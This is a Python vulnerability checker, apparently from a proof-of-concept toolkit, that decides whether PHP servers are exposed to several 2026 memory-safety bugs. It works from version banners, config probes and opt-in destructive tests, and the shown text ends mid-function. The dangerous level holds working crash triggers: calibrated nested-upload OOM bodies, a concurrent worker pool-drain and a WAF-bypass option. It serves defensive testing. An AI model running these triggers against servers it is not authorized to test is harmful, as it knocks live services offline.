#!/usr/bin/env python3
"""php2shell vulnerability checker - decide whether a PHP server needs the
21-Oct-2026 patch line (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12).

Covers four bugs closed by that one coordinated release:
  core:   CVE-2026-109618 (OOM half-built-state request-shutdown walk)
          CVE-2026-109619 (stale-global / upload-progress / unserialize dangle)
  lexbor: :lexbor-contains() CSS-selector heap buffer overflow
          IDNA ToASCII heap over-read

Three levels (cumulative): each level includes the ones below it.
  passive   banner + config read only; no load, no bug interaction.
  soft      non-destructive active probes: config facts, reachability,
            feasibility of the definitive test. Never crashes a worker.
  dangerous the definitive differential. Can momentarily crash/hang a worker
            IF the server is vulnerable (a patched server is unharmed). Opt-in:
            requires --i-own-this.

The core group is black-box (URL only). The lexbor group is application-sink
gated: pass --selector-sink / --url-parse-sink or it is reported SKIPPED, never
"safe". Assembly only: it imports proven modules read-only.

Usage:
  python3 -I poc/detect.py --url http://host/                      # passive (default)
  python3 -I poc/detect.py --url http://host/ --level soft
  python3 -I poc/detect.py --url http://host/ --level dangerous --i-own-this
  python3 -I poc/detect.py --url http://host/ --level soft \\
      --url-parse-sink 'http://host/resolve.php?u={}'              # lexbor IDNA (soft)
  python3 -I poc/detect.py --url http://host/ --level dangerous --i-own-this \\
      --selector-sink 'http://host/search.php?sel={}'             # lexbor crash oracle
  python3 -I poc/detect.py --url http://host/ --local             # + shell/log probes

Lab / analysis use only, on systems you own or are explicitly authorized to test.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import threading
import time

_POC_ROOT = os.path.dirname(os.path.abspath(__file__))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)

from common.http_urllib import http, http_full                        # noqa: E402
from common.multipart import multipart_default, part_tuple            # noqa: E402
from common.multipart import part as _mpart, terminator as _mterm     # noqa: E402
from primitives.groom.upload_progress_seed import (                   # noqa: E402
    file_parts, progress_preamble)
from bugs.files_key_stale_bucket import build_parts, IDX_LEN           # noqa: E402
from primitives.oracles.config_probe import read_fingerprint, parse_phpinfo  # noqa: E402
from primitives.oracles import waf_detect                             # noqa: E402
from primitives.encode.waf_bypass import WafProfile                   # noqa: E402
from primitives.oracles import version_verdict as vv                  # noqa: E402
from primitives.oracles import fpm_behavior as fb                     # noqa: E402
from primitives.oracles.wp_probe import detect_wordpress, POST_ENDPOINTS  # noqa: E402
from primitives.oracles.fpm_session_growth import detect_growth          # noqa: E402

V_NA = vv.NOT_AFFECTED
V_CONFIRMED = "VULNERABLE"          # observed, high confidence
V_INCONCL = "INCONCLUSIVE"


# --------------------------------------------------------------------------- #
# color + progress helpers (plain under --json / non-tty / --color never)
# --------------------------------------------------------------------------- #
_USE_COLOR = False       # set in main()


def _c(code, s):
    return f"\033[{code}m{s}\033[0m" if _USE_COLOR else s


def ok(s):    return _c("32", s)       # green  - clean / patched / not-affected
def warn(s):  return _c("33", s)       # yellow - inconclusive / unknown / caveat
def bad(s):   return _c("31;1", s)     # red    - vulnerable / crash confirmed
def dim(s):   return _c("2", s)        # dim    - progress / info
def bold(s):  return _c("1", s)


def verdict_color(v):
    """Wrap a verdict token in its semantic color."""
    if v in (V_CONFIRMED, vv.LIKELY_VULNERABLE):
        return bad(v)
    if v in (vv.LIKELY_PATCHED, vv.NOT_AFFECTED):
        return ok(v)
    return warn(v)                     # INCONCLUSIVE / UNKNOWN / anything else


def _body_mb(n_pad, idx_len, pad_field=16384, part_overhead=170):
    """Estimate the multipart body size (MB) build_parts(n_pad, idx_len) makes:
    n_pad padding fields + the two nested upload parts."""
    return (n_pad * (pad_field + part_overhead) + 2 * (idx_len + part_overhead)) / 1024 / 1024


class Skip(Exception):
    """Raised to abort the current sub-test when it exceeds --stale-timeout."""


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def _bytes_of(limit):
    """'16M'/'128M'/'-1'/'1048576' -> int bytes. -1 -> None (no limit)."""
    if limit is None:
        return 0
    s = str(limit).strip().lower()
    if s in ("-1", ""):
        return None
    m = re.match(r"(\d+)\s*([kmg]?)", s)
    if not m:
        return 0
    n = int(m.group(1))
    return n * {"": 1, "k": 1024, "m": 1024**2, "g": 1024**3}[m.group(2)]


def _alive(base, path, timeout):
    """True iff GET base/path returns HTTP 200 (worker-liveness check)."""
    st, _ = http(base.rstrip("/") + "/" + path.lstrip("/"), timeout=timeout)
    return st == 200


def _probe_state(base, path, timeout):
    """GET base/path and classify it (waf_detect.classify): 'ok' (200, serving),
    'down' (transport failure -> worker-liveness signal), or a WAF verdict
    ('blocked'/'ratelimited'/'challenge') / 'other'. Lets the active tests tell a
    WAF block from a real crash before concluding VULNERABLE."""
    url = base.rstrip("/") + "/" + path.lstrip("/")
    st, hdrs, body = http_full(url, timeout=timeout)
    return waf_detect.classify(st, hdrs, body)


def _liveness(base, path, timeout):
    """Worker-liveness for the active crash tests, WAF-aware. Returns 'alive'
    (HTTP 200), 'waf' (a WAF/CDN block/ratelimit/challenge -- NOT a crash) or
    'dead' (transport failure or a non-WAF 5xx -- a real worker-death signal)."""
    v = _probe_state(base, path, timeout)
    if v == "ok":
        return "alive"
    if waf_detect.is_interference(v):
        return "waf"
    return "dead"


class Report:
    def __init__(self):
        self.findings = {}        # bug_id -> dict
        self.notes = []
        self.votes = []           # independent oracle signals (the confidence panel)
        self.waf = None           # WAF/CDN vendor fingerprinted passively, else None

    def set(self, bug_id, **kw):
        self.findings.setdefault(bug_id, {}).update(kw)

    def note(self, msg):
        self.notes.append(msg)

    def active(self, bug_id, outcome, reason):
        """Record an ACTIVE-test outcome (black-box crash/hang attempt) WITHOUT
        touching the governing version verdict. A non-crash result never
        downgrades a version-based verdict; only an observed crash upgrades it
        (handled by setting verdict=V_CONFIRMED directly)."""
        self.findings.setdefault(bug_id, {}).update(
            {"active_outcome": outcome, "active_reason": reason})

    def vote(self, name, finding, bears_on_patch, implies, confidence):
        """Record one oracle's independent signal.
        bears_on_patch: True if this signal can move the patched/vulnerable verdict;
        False if it only corroborates the affected class or recovers config."""
        self.votes.append({"oracle": name, "finding": finding,
                           "bears_on_patch_state": bears_on_patch,
                           "implies": implies, "confidence": confidence})


# --------------------------------------------------------------------------- #
# Level 1 -- passive
# --------------------------------------------------------------------------- #
def l1_passive(args, rep, log):
    base = args.url.rstrip("/")
    path = "/" + args.path.lstrip("/")
    st, hdrs, body = http_full(base + path, timeout=args.timeout)
    fp = read_fingerprint(st, hdrs, body)

    if args.php_version:
        fp["version"] = vv.parse_version(args.php_version)
    if args.sapi:
        fp["sapi"] = args.sapi

    ver_s = ".".join(map(str, fp["version"])) if fp["version"] else "UNKNOWN"
    log(f"[passive] {path} -> HTTP {st}")
    log(f"[passive] Server: {fp['server'] or '(none)'}   "
        f"X-Powered-By: {fp['powered_by'] or '(none)'}")
    log(f"[passive] PHP version: {ver_s}   SAPI: {fp['sapi'] or 'UNKNOWN'}")
    if fp["config"]:
        log(f"[passive] config volunteered: {fp['config']}")

    # WAF/CDN fingerprint: an intermediary can block probes (false negative) or be
    # misread by the active tests as a crash (false positive). Flag it and point
    # at --waf-bypass; the active level then refuses to call a WAF block a crash.
    fp["waf"] = waf_detect.fingerprint(hdrs, fp.get("server"))
    rep.waf = fp["waf"]
    if fp["waf"]:
        log(warn(f"[passive] WAF/CDN detected: {fp['waf']} -- it can block probes or be "
                 "misread by active tests. If results look off, re-run with --waf-bypass."))
        rep.note(f"WAF/CDN in front: {fp['waf']} (active-level signals verified against it; "
                 "blocks are reported as blocked, not as a crash). --waf-bypass available.")

    # optional phpinfo read (still passive: just reading a page)
    if args.phpinfo_url:
        ist, _, ibody = http_full(args.phpinfo_url, timeout=args.timeout)
        info = parse_phpinfo(ibody)
        if info:
            log(f"[passive] phpinfo(): {info}")
            if not fp["version"] and info.get("php"):
                fp["version"] = vv.parse_version(info["php"])
            for k in ("memory_limit", "post_max_size", "max_file_uploads"):
                if k in info:
                    fp["config"].setdefault(k, info[k])
            if "session.upload_progress.enabled" in info:
                fp["config"]["upload_progress"] = info["session.upload_progress.enabled"]
            fp["phpinfo"] = info

    core = vv.verdict(fp["version"])
    lex = vv.lexbor_verdict(fp["version"])
    rep.set("core_109618", verdict=core["verdict"], confidence="version-based",
            level="passive", reason=core["reason"], caveats=core["caveats"])
    rep.set("core_109619", verdict=core["verdict"], confidence="version-based",
            level="passive", reason=core["reason"], caveats=core["caveats"])
    rep.set("lexbor_contains", verdict=lex["verdict"], confidence="version-based",
            level="passive", reason=lex["reason"], caveats=lex["caveats"])
    rep.set("lexbor_idna", verdict=lex["verdict"], confidence="version-based",
            level="passive", reason=lex["reason"], caveats=lex["caveats"])
    log(f"[passive] core-CVE verdict: {verdict_color(core['verdict'])} "
        + dim(f"({core['reason']})"))
    log(f"[passive] lexbor verdict:   {verdict_color(lex['verdict'])} "
        + dim(f"({lex['reason']})"))

    if fp["version"]:
        rep.vote("version_banner",
                 f"PHP {ver_s} from {'X-Powered-By' if fp['powered_by'] else 'config'}",
                 bears_on_patch=True, implies=core["verdict"],
                 confidence="high (subject to distro backports)")
    else:
        rep.vote("version_banner", "no PHP version disclosed (expose_php=Off?)",
                 bears_on_patch=True, implies=vv.UNKNOWN,
                 confidence="n/a -- no behavioral minor-version fingerprint exists")
    if fp["sapi"]:
        rep.vote("stack_fingerprint", f"SAPI={fp['sapi']}", bears_on_patch=False,
                 implies="affected-class context", confidence="high")
    return fp


# --------------------------------------------------------------------------- #
# Level 2 -- soft (non-destructive)
# --------------------------------------------------------------------------- #
def l2_soft(args, fp, rep, log):
    cfg = fp.get("config", {})
    sapi = fp["sapi"]

    # upload-progress reachability (CVE-2026-109619 lives on this pre-RINIT path)
    up = cfg.get("upload_progress")
    if up in ("1", 1, "On", "on", True):
        log("[soft] session.upload_progress: ENABLED -> CVE-2026-109619 "
            "pre-RINIT path is reachable")
        rep.set("core_109619", reachable=True)
    elif up in ("0", 0, "Off", "off", False):
        log("[soft] session.upload_progress: DISABLED -> the upload-progress "
            "variant of CVE-2026-109619 is not reachable (the unserialize "
            "variant may still be, via an app sink)")
        rep.set("core_109619", reachable=False)
    else:
        log("[soft] session.upload_progress: UNKNOWN (no config channel) -- "
            "default is enabled on stock PHP; treat as reachable unless confirmed off")
        rep.set("core_109619", reachable=None)

    # feasibility of the dangerous OOM differential given the memory ceiling
    ml = cfg.get("memory_limit")
    mlb = _bytes_of(ml)
    pmb = _bytes_of(cfg.get("post_max_size"))
    if ml is None or mlb == 0:
        log("[soft] memory_limit: UNKNOWN -- dangerous-test trigger sizing "
            "cannot be pre-checked")
        feas = "unknown"
    elif mlb is None:
        log("[soft] memory_limit = -1 (NO LIMIT) -> the OOM trigger path cannot "
            "fire; the dangerous differential would be INCONCLUSIVE here")
        feas = "unreachable"
    else:
        log(f"[soft] memory_limit = {ml} ({mlb} bytes)"
            + (f", post_max_size = {cfg.get('post_max_size')} ({pmb} bytes)" if pmb else ""))
        if mlb <= 32 * 1024**2:
            log("[soft] small memory_limit -> OOM trigger is easy to reach "
                "(the $_FILES amplifier needs few parts)")
            feas = "easy"
        else:
            log("[soft] large memory_limit -> OOM trigger needs a high part count "
                "(the deeply-nested $_FILES amplifier); default --parts may be too low")
            feas = "needs-scaling"
    rep.set("core_109618", feasibility=feas)
    rep.set("core_109619", feasibility=feas)

    # behavioral panel: recover config + OOM reachability black-box (independent
    # corroboration oracles; on fpm these do NOT decide patch state -- recorded
    # truthfully). Each OOM probe makes an fpm child exit (code 70) and respawn.
    if args.behavioral:
        _behavioral_panel(args, fp, rep, log)

    # lexbor soft: the IDNA over-read can be confirmed NON-destructively through
    # an operator-declared Url::parse()+reflect sink (spray-and-recognize).
    if args.url_parse_sink:
        _lexbor_idna_soft(args, fp, rep, log)
    else:
        log("[soft] lexbor IDNA: no --url-parse-sink declared -> SKIPPED "
            "(not 'safe'; supply a Url::parse()+reflect endpoint to confirm)")
        if rep.findings.get("lexbor_idna", {}).get("verdict") not in (V_NA,):
            rep.set("lexbor_idna", soft="skipped-no-sink")


def _lexbor_idna_soft(args, fp, rep, log):
    """Non-destructive IDNA heap over-read check against a declared reflect sink.
    Sends a special-scheme URL with many non-ASCII labels after spraying a
    recognizable token; a token echoed in the reflected host = disclosure.
    Mechanism per poc/bugs/lexbor_idna_leak.py (that module is the local-CLI A/B).
    """
    token = "HeapLeakZZ"
    host = ".".join(["\xc3\xa4"] * args.idna_labels)   # 'ä' labels
    url_val = "http://" + host + "/"
    sink = args.url_parse_sink
    probe = sink.replace("{}", _urlq(url_val)) if "{}" in sink else sink + _urlq(url_val)
    hit = False
    for _ in range(args.idna_trials):
        st, body = http(probe, timeout=args.timeout)
        if body and token.encode() in body:
            hit = True
            break
    if hit:
        log("[soft] lexbor IDNA: token disclosed in reflected host -> "
            "VULNERABLE (heap over-read confirmed, non-destructively)")
        rep.set("lexbor_idna", verdict=V_CONFIRMED, confidence="observed",
                level="soft", reason="sprayed token echoed via getAsciiHost()")
    else:
        log("[soft] lexbor IDNA: no token disclosed over "
            f"{args.idna_trials} trials -> INCONCLUSIVE (patched, or the sink "
            "does not reflect the parsed host)")
        rep.set("lexbor_idna", soft="no-leak-observed")


def _urlq(s):
    from urllib.parse import quote
    return quote(s, safe="")


def _behavioral_panel(args, fp, rep, log):
    """Black-box corroboration oracles for a realistic fpm target: recover the
    OOM-flip point and classify the OOM response shape. On fpm both patched and
    vulnerable builds answer a parse-time OOM identically (nginx 502, fpm child
    exit code 70, no SIGSEGV), so these corroborate the affected class / recover
    config but do NOT separate patch state -- recorded with that honesty."""
    post = (args.url.rstrip("/") + "/" + args.post_path.lstrip("/"))
    log("[behavioral] probing the OOM-flip point (POST field size that exhausts "
        "memory_limit; each probe respawns one fpm child; Ctrl-C to skip) ...")
    t0 = time.time()

    def _prog(kb, phase):
        el = time.time() - t0
        if args.stale_timeout and el > args.stale_timeout:
            raise Skip(f"--stale-timeout {args.stale_timeout}s exceeded")
        log(dim(f"[behavioral] [{phase}] trying ~{kb/1024:.1f}MB field, "
                f"elapsed {el:.0f}s ..."))

    try:
        r = fb.measure_oom_flip(http, post, cap_kb=args.flip_cap_kb,
                                timeout=args.req_timeout, progress=_prog)
    except Skip as e:
        log(warn(f"[behavioral] OOM-flip SKIPPED ({e}) -> no reading"))
        rep.vote("oom_flip", f"skipped ({e})", bears_on_patch=False,
                 implies="no behavioral reading", confidence="n/a")
        return
    if not r["reached"]:
        log(warn(f"[behavioral] no OOM within a {args.flip_cap_kb}KB field -- likely "
                 "post_max_size < memory_limit (size probe can't reach the OOM). Not a "
                 "patch signal either way."))
        rep.vote("oom_flip", f"no OOM up to {args.flip_cap_kb}KB field",
                 bears_on_patch=False,
                 implies="OOM not reachable by body size (post_max < memory_limit)",
                 confidence="n/a for patch state")
        return
    lo, hi = r["flip_low_bytes"] // 1024, r["flip_high_bytes"] // 1024
    log(f"[behavioral] OOM-flip at a ~{hi}KB POST field (shape: {r['shape']}) -> "
        "the memory_limit OOM path is reachable (exact limit not recoverable black-box)")
    rep.set("core_109618", oom_flip_kb=hi)
    rep.vote("oom_flip", f"OOM reachable at ~{hi}KB field (headroom lower bound)",
             bears_on_patch=False, implies="affected-class corroborated (OOM reachable)",
             confidence="high")
    disc = r["shape"] in fb.NON_DISCRIMINATING
    rep.vote("oom_shape", f"OOM response shape = {r['shape']}",
             bears_on_patch=not disc,
             implies=("on fpm this shape is identical on patched and vulnerable "
                      "builds -- NOT evidence of vulnerability"),
             confidence="n/a for patch state on fpm")
    log("[behavioral] NOTE: a 502/empty-500 on the OOM fires on patched builds too "
        "(fpm exit 70) -- not a vulnerability signal by itself; version banner governs.")
    log(dim('[behavioral]   owner: confirm the OOM in the PHP error log -- "Allowed '
            'memory size of N bytes exhausted".'))




def _recovery_check(args, base, rep, log, attempts=5):
    """After the destructive tests, probe whether the target still serves. A
    persistent degradation on fpm is consistent with workers hung/lost on the
    CVE-2026-109619 deadlock (held until request_terminate_timeout, often never),
    so it is both a health note and a vulnerability hint."""
    path = args.path
    ok_n = slow = interf = down = 0
    for _ in range(attempts):
        t0 = time.time()
        st, hdrs, body = http_full(base + "/" + path.lstrip("/"), timeout=args.alive_timeout)
        dt = time.time() - t0
        v = waf_detect.classify(st, hdrs, body)
        if v == "ok":
            ok_n += 1
            if dt > max(2.0, args.alive_timeout / 2):
                slow += 1
        elif waf_detect.is_interference(v):
            interf += 1
        elif v == "down":
            down += 1
    if ok_n == attempts and slow == 0:
        log(ok(f"[recovery] target healthy after the test ({ok_n}/{attempts} fast 200s)."))
    elif interf >= down and interf > 0:
        # the "not serving" is a WAF block/ratelimit, NOT a hung worker -- do NOT
        # upgrade to VULNERABLE; the signal is unusable through this WAF.
        log(warn(f"[recovery] target returned WAF blocks/ratelimits after the test "
                 f"({interf}/{attempts}), not a crash -- recovery signal unusable through "
                 "the WAF. Not a vulnerability signal; re-run with --waf-bypass."))
        rep.active("core_109619", "waf-blocked",
                   "post-test recovery probes were WAF-blocked/ratelimited, not a worker "
                   "crash -- inconclusive through the WAF (use --waf-bypass)")
        rep.note("post-test recovery was WAF-blocked, not a crash -- no hung-worker "
                 "conclusion drawn.")
    elif ok_n == 0 and down > 0:
        log(bad(f"[recovery] target NOT serving after the test ({down}/{attempts} transport "
                "failures) -- fpm workers hung on the 109619 deadlock. Restart php-fpm; a "
                "persistent hang is itself evidence the bug fired."))
        rep.note("post-test: target unresponsive (transport failures) -- likely hung/lost "
                 "fpm workers (restart php-fpm); consistent with the 109619 deadlock.")
        rep.active("core_109619", "crash",
                   "target stopped serving (transport failures) after the consumer -- fpm "
                   "workers hung (109619 deadlock); recover by restarting php-fpm")
        rep.set("core_109619", verdict=V_CONFIRMED, confidence="observed",
                level="dangerous",
                reason="target went unresponsive (transport failures) after the consumer")
    else:
        log(warn(f"[recovery] target DEGRADED after the test ({ok_n}/{attempts} ok, "
                 f"{slow} slow, {interf} waf, {down} down) -- some fpm workers may be "
                 "hung/lost. Restart php-fpm and re-run."))
        rep.note(f"post-test: target degraded ({ok_n}/{attempts} ok) -- possible hung "
                 "workers; restart php-fpm and re-check.")


def l3_dangerous(args, fp, rep, log):
    base = args.url.rstrip("/")
    sapi = fp["sapi"]
    log(bad("[dangerous] WARNING: can wedge/crash a worker (DoS on a vulnerable "
            "target). Do NOT run against production."))
    log(dim("[dangerous] recovery: restart php-fpm; with cleanup=Off, delete leftover "
            "sess_*/upload temp files in session.save_path."))

    # Baseline liveness guard: the whole dangerous level reads crash/hang signals
    # as a DROP from "serving" to "not serving". If the target is already not
    # serving a plain request, abort -- a pre-existing outage must not be misread
    # as the bug firing (otherwise a connection failure looks like a hung worker).
    st0, dt0 = _fresh_probe(base, args.path, args.alive_timeout)
    if st0 == "down":
        log(bad(f"[dangerous] target not serving before the test (GET {args.path}, "
                f"{dt0:.1f}s) -- ABORTING (can't tell outage from bug). Version verdict stands."))
        rep.note("dangerous level aborted: target was not serving before the test "
                 "(no crash/hang signal is trustworthy on an already-down target).")
        return
    if waf_detect.is_interference(st0):
        log(bad(f"[dangerous] baseline GET is WAF-blocked ({st0}) -- no clean signal through "
                "the WAF, every active test would read as blocked. ABORTING; re-run with "
                "--waf-bypass. Version verdict stands."))
        rep.note(f"dangerous level aborted: baseline WAF-blocked ({st0}) -- use --waf-bypass.")
        return
    log(dim(f"[dangerous] baseline: target serving a plain request ({dt0:.1f}s) -- proceeding."))

    if fp.get("config", {}).get("memory_limit") and \
            _bytes_of(fp["config"]["memory_limit"]) is None:
        log(warn("[dangerous] memory_limit=-1 -> OOM trigger can't fire; active test N/A "
                 "(mitigation, not a patch). Version verdict stands."))
        rep.active("core_109618", "blocked", "memory_limit=-1 (mitigation); OOM path unreachable")
        rep.active("core_109619", "blocked", "memory_limit=-1 (mitigation); OOM path unreachable")
        rep.note("memory_limit=-1 detected: a hardening stopgap, not a fix.")
    else:
        # CVE-2026-109618: shutdown-walk of half-built $_FILES. The crash is in
        # request shutdown (after the response), so the only signal is worker
        # liveness afterwards. Deterministic under ASan; probabilistic on stock.
        # fpm exits cleanly on the pure startup-OOM, so skip 109618 there.
        if sapi == "fpm":
            log(dim("[dangerous] CVE-2026-109618: fpm answers startup-OOM cleanly "
                    "-> active crash test N/A on fpm; version verdict governs."))
            log(dim('[dangerous]   owner: confirm in the fpm log -- "exited on signal 11 '
                    '(SIGSEGV)" after an OOM = the 109618 crash (vulnerable); "exited with '
                    'code 70" = clean OOM (inconclusive).'))
            rep.active("core_109618", "n/a-on-fpm",
                       "startup-OOM crash differential does not apply to fpm "
                       "(sink-free); version verdict governs")
        else:
            _test_109618(args, base, rep, log)

        # CVE-2026-109619: upload-progress stale PS(id). Two requests; a hang or
        # dead worker on R2 = vulnerable.
        _test_109619(args, base, rep, log)

        # On fpm the self-arm above does not fire (exit-70). Run the accumulation
        # 'Affected' oracle: grow a session (cleanup=On defeated) until a benign
        # touch flips to a caught OOM -> the CVE-2026-109619 surface is LIVE.
        if sapi == "fpm" and args.fpm_growth and \
                rep.findings.get("core_109619", {}).get("verdict") != V_CONFIRMED:
            _fpm_growth_probe(args, base, rep, log)

    # lexbor contains-overflow crash oracle (needs a declared selector sink)
    if args.selector_sink:
        _test_lexbor_contains(args, base, rep, log)
    else:
        log("[dangerous] lexbor contains-overflow: no --selector-sink declared "
            "-> SKIPPED (not 'safe')")
        if rep.findings.get("lexbor_contains", {}).get("verdict") not in (V_NA,):
            rep.set("lexbor_contains", dangerous="skipped-no-sink")

    _recovery_check(args, base, rep, log)


def _test_109618(args, base, rep, log):
    """Self-calibrating nested-$_FILES differential (no reference build needed).

    A nested upload (u[a...][k], u[b...][k]) plus a calibrated run of padding
    fields makes the memory_limit fatal land inside an intermediate-key
    allocation, after nNumUsed++ has claimed the bucket but before the fallible
    zend_string_init. A vulnerable build then releases the uninitialized bucket
    at request shutdown -> worker dies. Trigger reused from
    bugs/files_key_stale_bucket.py; here we locate the OOM crossing ON THE
    TARGET, then sweep upward watching for a dead worker. Deterministic under
    ASan; best-effort on stock non-ASan (the uninitialized read may not fault).
    """
    post = base + "/" + args.post_path.lstrip("/")
    t0 = time.time()
    state = {"step": 0}

    def fire(n_pad, phase):
        """Build + send one probe, printing progress BEFORE the (possibly slow)
        request. Honors --max-body-mb and the --stale-timeout wall-clock budget."""
        state["step"] += 1
        mb = _body_mb(n_pad, args.idx_len)
        el = time.time() - t0
        if mb > args.max_body_mb:
            raise Skip(f"next body ~{mb:.0f}MB exceeds --max-body-mb {args.max_body_mb} "
                       f"at {n_pad} pad fields")
        if args.stale_timeout and el > args.stale_timeout:
            raise Skip(f"--stale-timeout {args.stale_timeout}s exceeded ({el:.0f}s elapsed)")
        log(dim(f"[dangerous] 109618 [{phase}] step {state['step']}: trying {n_pad} pad "
                f"(~{mb:.1f}MB body), elapsed {el:.0f}s, per-req cap {args.req_timeout:.0f}s ..."))
        body, headers = multipart_default(build_parts(n_pad, args.idx_len))
        return http(post, data=body, headers=headers, timeout=args.req_timeout)

    def confirmed(where):
        log(bad(f"[dangerous] CVE-2026-109618: worker DEAD at {where} -> VULNERABLE"))
        rep.set("core_109618", verdict=V_CONFIRMED, confidence="observed",
                level="dangerous", active_outcome="crash",
                active_reason=f"worker died at {where}",
                reason=f"worker died when the OOM landed on a nested-$_FILES key "
                       f"allocation ({where})")

    def waf_blocked(where):
        log(warn(f"[dangerous] CVE-2026-109618: liveness probe WAF-blocked at {where} -- "
                 "can't read worker state through the WAF. Re-run with --waf-bypass."))
        rep.active("core_109618", "waf-blocked",
                   f"liveness probe WAF-blocked at {where} (not a crash); use --waf-bypass")

    def partial(reason):
        log(warn(f"[dangerous] CVE-2026-109618: active crash test SKIPPED ({reason}); "
                 f"{state['step']} probes in {time.time() - t0:.0f}s -- version verdict stands"))
        rep.active("core_109618", "skipped",
                   f"active crash test skipped before completing: {reason}")

    try:
        # phase 1: grow padding until the nested-upload request crosses memory_limit
        log(f"[dangerous] CVE-2026-109618: locating the OOM crossing on the target "
            f"(nested keys, up to {args.pad_cap} pad fields; Ctrl-C to skip) ...")
        last200, n, crossed = 0, 256, None
        while n <= args.pad_cap:
            s, _ = fire(n, "grow")
            if s == 413:
                log(warn(f"[dangerous] CVE-2026-109618:   {n} pad hit post_max_size (413) "
                         "before the OOM -- can't reach the crash here"))
                rep.active("core_109618", "blocked",
                           "post_max_size too small to reach the memory_limit OOM")
                return
            ls = _liveness(base, args.path, args.alive_timeout)
            log(f"[dangerous] CVE-2026-109618:   {n} pad -> HTTP {s}, worker "
                + (ok("alive") if ls == "alive" else warn("WAF") if ls == "waf" else bad("DEAD")))
            if ls == "waf":
                waf_blocked(f"{n} padding fields")
                return
            if ls == "dead":
                confirmed(f"{n} padding fields")
                return
            if s != 200:
                crossed = n
                break
            last200, n = n, n * 2
        if crossed is None:
            log(warn("[dangerous] CVE-2026-109618: OOM not reached within the "
                     f"{args.pad_cap}-pad / {args.max_body_mb}MB budget -- memory_limit "
                     "high or -1 (stopgap, not a patch). Version verdict stands."))
            rep.active("core_109618", "no-oom-reached",
                       "OOM not reached within the budget -- likely memory_limit high/-1 "
                       "(mitigation, not a patch)")
            rep.note("possible mitigation: memory_limit high or -1 (stopgap, not a fix)")
            return

        # binary-search the exact 200->non-200 crossing (watch for a dead worker)
        lo, hi = last200, crossed
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            s, _ = fire(mid, "calibrate")
            ls = _liveness(base, args.path, args.alive_timeout)
            if ls == "waf":
                waf_blocked(f"{mid} padding fields (during calibration)")
                return
            if ls == "dead":
                confirmed(f"{mid} padding fields (during calibration)")
                return
            lo, hi = (mid, hi) if s == 200 else (lo, mid)
        n500 = hi

        # phase 2: sweep upward; a vulnerable landing kills the worker at shutdown
        log(f"[dangerous] CVE-2026-109618: OOM crossing ~{n500} pad; sweeping +{args.span} "
            f"(step {args.step}) for a deadly landing ...")
        k = n500
        while k <= n500 + args.span:
            s, _ = fire(k, "sweep")
            ls = _liveness(base, args.path, args.alive_timeout)
            if ls == "waf":
                waf_blocked(f"{k} padding fields (during sweep)")
                return
            if ls == "dead":
                confirmed(f"{k} padding fields")
                return
            k += args.step
        log(warn("[dangerous] CVE-2026-109618: no worker crash across the swept window "
                 "-- patched, or vulnerable-but-non-faulting stock non-ASan (widen --span). "
                 "Version verdict stands."))
        log(dim('[dangerous]   owner: confirm in the fpm/php log -- "exited on signal 11 '
                '(SIGSEGV)" during request shutdown = the crash fired (vulnerable).'))
        rep.active("core_109618", "no-crash",
                   "OOM reached and swept but no worker crash observed (patched, or "
                   "vulnerable stock non-ASan that did not fault)")
    except Skip as e:
        partial(str(e))


def _fresh_probe(base, path, timeout):
    """Time a plain GET on a NEW connection. Returns (state, seconds) where state
    is waf_detect.classify: 'ok' / 'down' / 'blocked' / 'ratelimited' /
    'challenge' / 'other'. A WAF block is NOT a worker-liveness signal."""
    t0 = time.time()
    st, hdrs, body = http_full(base.rstrip("/") + "/" + path.lstrip("/"), timeout=timeout)
    return waf_detect.classify(st, hdrs, body), time.time() - t0


def _pool_drain_probe(args, base, rep, log):
    """Escalation: a single wedged worker is invisible on a pool (others answer),
    so occupy EVERY worker at once and watch a FRESH request block pool-wide.
    Mechanism: launch --wedge-cap concurrent producer->consumer sequences and
    HOLD each hung consumer open (a completed/abandoned consumer frees its worker,
    so the holds must overlap). While they hold, probe a fresh SID: if it blocks
    while a pre-drain baseline was fast, the pool is saturated by deadlocked
    workers -> VULNERABLE. A full-pool denial-of-service by construction
    (already --i-own-this / non-production)."""
    post = base.rstrip("/") + "/" + args.post_path.lstrip("/")
    gpath = "/" + args.path.lstrip("/")
    victim = [part_tuple("victim", b"V" * 256, filename="v.bin",
                         ctype="application/octet-stream")]
    hold = args.lock_timeout * 2 + 10            # keep hung consumers held across the probe

    def hold_worker(sid):
        try:
            pb, ph = multipart_default(progress_preamble(sid) + list(file_parts(args.parts, name_len=16)))
            http(post, data=pb, headers=ph, timeout=args.req_timeout)    # arm: producer OOM
            cb, ch = multipart_default(progress_preamble(sid) + victim)
            http(post, data=cb, headers=ch, timeout=hold)                # consumer: hang, holds the worker
        except Exception:
            pass

    st0, dt0 = _fresh_probe(base, gpath, args.lock_timeout)
    log(dim(f"[dangerous] 109619 pool-drain: baseline fresh request state={st0} ({dt0:.1f}s)"))
    if st0 != "ok":
        why = ("WAF-blocked" if waf_detect.is_interference(st0) else "not serving")
        log(warn(f"[dangerous] 109619 pool-drain: baseline fresh request {why} ({st0}) "
                 "before draining -- can't run the differential"
                 + (" (re-run with --waf-bypass)." if waf_detect.is_interference(st0)
                    else " (restart + re-try).")))
        rep.active("core_109619", "waf-blocked" if waf_detect.is_interference(st0) else "ambiguous",
                   f"baseline {why} before pool-drain ({st0})")
        return

    log(dim(f"[dangerous] 109619 pool-drain: launching {args.wedge_cap} concurrent "
            "wedge-and-hold sequences to occupy every worker ..."))
    threads = [threading.Thread(target=hold_worker, args=(("%032x" % i).encode(),),
                                daemon=True) for i in range(args.wedge_cap)]
    for t in threads:
        t.start()
    time.sleep(min(hold / 2, args.req_timeout + 3))   # let them arm + engage workers

    down = interf = 0
    for _ in range(3):                                  # probe a fresh SID a few times
        st, dt = _fresh_probe(base, gpath, args.lock_timeout)
        log(dim(f"[dangerous] 109619 pool-drain: during hold, fresh request "
                f"state={st} ({dt:.1f}s)"))
        if st == "down":
            down += 1
        elif waf_detect.is_interference(st):
            interf += 1
    if interf >= 2 and interf > down:
        log(warn(f"[dangerous] CVE-2026-109619: fresh requests during the hold were "
                 f"WAF-blocked ({interf}/3), not deadlocked -- can't demonstrate the drain "
                 "through the WAF. Re-run with --waf-bypass. Version verdict stands."))
        rep.active("core_109619", "waf-blocked",
                   "pool-drain fresh probes were WAF-blocked, not a deadlock (use --waf-bypass)")
